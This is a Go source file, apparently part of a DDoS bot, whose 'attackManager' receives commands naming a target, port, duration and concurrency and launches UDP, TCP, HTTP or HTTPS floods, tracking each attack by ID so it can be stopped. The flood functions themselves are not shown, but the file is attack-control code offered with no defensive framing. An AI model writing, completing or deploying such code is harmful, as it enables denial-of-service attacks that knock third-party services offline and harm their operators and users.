package main

import (
	"context"
	"log"
	"sync"
	"time"
)

type attackManager struct {
	mu      sync.Mutex
	active  map[string]context.CancelFunc
}

func newAttackManager() *attackManager {
	return &attackManager{
		active: make(map[string]context.CancelFunc),
	}
}

func (m *attackManager) start(cmd Command) {
	m.mu.Lock()
	defer m.mu.Unlock()

	if cancel, exists := m.active[cmd.AttackID]; exists {
		cancel()
	}

	ctx, cancel := context.WithCancel(context.Background())
	m.active[cmd.AttackID] = cancel

	go func() {
		defer func() {
			m.mu.Lock()
			delete(m.active, cmd.AttackID)
			m.mu.Unlock()
		}()

		runCtx, runCancel := context.WithTimeout(ctx, time.Duration(cmd.Time)*time.Second)
		defer runCancel()

		switch cmd.Method {
		case "UDP":
			log.Printf("[%s] Starting UDP flood on %s:%s for %ds (%d concurrents)", cmd.AttackID[:8], cmd.Target, cmd.Port, cmd.Time, cmd.Concurrents)
			udpFlood(runCtx, cmd.Target, cmd.Port, cmd.Concurrents)

		case "TCP":
			log.Printf("[%s] Starting TCP flood on %s:%s for %ds (%d concurrents)", cmd.AttackID[:8], cmd.Target, cmd.Port, cmd.Time, cmd.Concurrents)
			tcpFlood(runCtx, cmd.Target, cmd.Port, cmd.Concurrents)

		case "HTTP":
			log.Printf("[%s] Starting HTTP flood on %s for %ds (%d concurrents, %d rpc)", cmd.AttackID[:8], cmd.Target, cmd.Time, cmd.Concurrents, cmd.Rpc)
			httpFlood(runCtx, cmd.Target, cmd.Concurrents, cmd.Rpc, false)

		case "HTTPS":
			log.Printf("[%s] Starting HTTPS flood on %s for %ds (%d concurrents, %d rpc)", cmd.AttackID[:8], cmd.Target, cmd.Time, cmd.Concurrents, cmd.Rpc)
			httpFlood(runCtx, cmd.Target, cmd.Concurrents, cmd.Rpc, true)

		default:
			log.Printf("[%s] Unknown method: %s", cmd.AttackID[:8], cmd.Method)
			return
		}

		logf("[%s] Attack finished", cmd.AttackID[:8])
	}()
}

func (m *attackManager) stop(attackID string) {
	m.mu.Lock()
	defer m.mu.Unlock()

	if cancel, exists := m.active[attackID]; exists {
		cancel()
		delete(m.active, attackID)
		log.Printf("Attack %s stopped", attackID[:8])
	}
}

func (m *attackManager) stopAll() {
	m.mu.Lock()
	defer m.mu.Unlock()

	for id, cancel := range m.active {
		cancel()
		delete(m.active, id)
	}
}
